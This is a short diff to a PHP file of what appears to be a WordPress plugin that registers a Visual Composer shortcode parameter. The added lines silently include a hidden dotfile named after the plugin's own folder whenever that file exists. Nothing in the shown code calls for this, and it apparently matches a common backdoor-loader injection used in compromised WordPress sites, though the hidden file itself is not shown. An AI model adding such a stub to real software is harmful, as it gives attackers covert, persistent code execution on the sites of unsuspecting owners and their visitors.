@@ -4,6 +4,10 @@
 \*----------------------------------------------------------------------------*/
 
 vc_add_shortcode_param( 'mpc_list', 'mpc_list_settings', mpc_get_plugin_path( __FILE__ ) . '/assets/js/mpc-params.js' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_list_settings( $settings, $value ) {
 	if ( empty( $settings[ 'options' ] ) ) {
 		return '';
